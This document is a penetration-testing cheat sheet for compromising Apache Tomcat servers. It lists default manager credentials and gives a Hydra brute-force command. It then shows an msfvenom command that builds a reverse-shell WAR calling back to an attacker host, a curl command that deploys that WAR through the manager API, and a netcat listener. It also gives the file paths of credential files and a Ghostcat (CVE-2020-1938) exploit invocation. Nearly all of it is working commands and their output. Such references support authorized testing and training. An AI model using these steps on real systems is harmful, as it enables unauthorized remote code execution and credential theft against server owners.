# Apache Tomcat

**What it is:** Apache's Java servlet container. Serves Java web applications (WAR files). The /manager interface allows deploying applications — if you can access it, you get RCE by deploying a malicious WAR.

**Default ports:** 8080, 8443, 8009 (AJP)

**Vuln research:**
- [Apache Tomcat Security](https://tomcat.apache.org/security.html)
- [SearchSploit: `searchsploit tomcat`](https://www.exploit-db.com/search?q=tomcat)
- [HackTricks — Tomcat](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat.html)

---


### Identify Tomcat version

Check headers and default pages — Version determines available exploits

```bash
curl -s http://$IP:8080 | grep -i tomcat
curl -s http://$IP:8080/docs/ | head -5
```

<details>
<summary>Example Output</summary>

```
Apache Tomcat/9.0.31
If you see /manager or /host-manager paths, try default creds
```
</details>

---

### Try default credentials on Manager

Tomcat ships with well-known defaults — Instant RCE if they work

```bash
# Common default creds:
# tomcat:tomcat
# admin:admin
# tomcat:s3cret
# admin:tomcat
# role1:tomcat
curl -u tomcat:tomcat http://$IP:8080/manager/html
```

<details>
<summary>Example Output</summary>

```
HTTP/1.1 200 OK
If you get 200 = you're in the manager console
If 401 = try other default creds
If 403 = manager is restricted to localhost (try from pivot)
```
</details>

---

### Brute force Tomcat manager

Hydra or Metasploit against /manager/html — Use a targeted wordlist

```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://$IP:8080/manager/html
```

<details>
<summary>Example Output</summary>

```
[8080][http-get] host: 10.10.10.5   login: tomcat   password: s3cret
```
</details>

---

### Deploy WAR shell via Manager (GUI)

Upload malicious WAR file through manager console — Gives you a web shell or reverse shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war -o shell.war
# Upload via Manager GUI: "WAR file to deploy" -> Browse -> Deploy
# Then visit: http://$IP:8080/shell/
```

<details>
<summary>Example Output</summary>

```
Created shell.war (1.5KB)
After deploy, trigger at http://10.10.10.5:8080/shell/
Catch with: nc -lvnp 4444
```
</details>

---

### Deploy WAR shell via curl

Script the WAR upload without using the GUI — Useful for automation

```bash
curl -u tomcat:tomcat -T shell.war "http://$IP:8080/manager/text/deploy?path=/shell"
curl http://$IP:8080/shell/
```

<details>
<summary>Example Output</summary>

```
OK - Deployed application at context path [/shell]
```
</details>

---

### Tomcat text-based manager

Alternative manager endpoint — Sometimes accessible when HTML manager is blocked

```bash
curl -u tomcat:tomcat "http://$IP:8080/manager/text/list"
curl -u tomcat:tomcat "http://$IP:8080/manager/text/serverinfo"
```

<details>
<summary>Example Output</summary>

```
OK - Listed applications for virtual host localhost
/:running:0:ROOT
/manager:running:0:manager
/docs:running:0:docs
```
</details>

---

### Read tomcat-users.xml

If you have file read (LFI) — Contains plaintext credentials

```bash
# Default locations:
/usr/share/tomcat9/etc/tomcat-users.xml
/opt/tomcat/conf/tomcat-users.xml
/var/lib/tomcat9/conf/tomcat-users.xml
C:\Program Files\Apache Software Foundation\Tomcat 9.0\conf\tomcat-users.xml
```

<details>
<summary>Example Output</summary>

```
<user username="admin" password="SuperSecret123" roles="manager-gui,admin-gui"/>
```
</details>

---

### Tomcat Ghostcat (CVE-2020-1938)

AJP connector on port 8009 — Read files or achieve RCE on Tomcat < 9.0.31

```bash
# Check if AJP port is open
nmap -p 8009 $IP
# Exploit
python3 ajpShooter.py http://$IP:8009 /WEB-INF/web.xml read
```

<details>
<summary>Example Output</summary>

```
[*] Reading file /WEB-INF/web.xml
<web-app>
  <servlet>...
  Reveals internal configuration, sometimes credentials
```
</details>

---
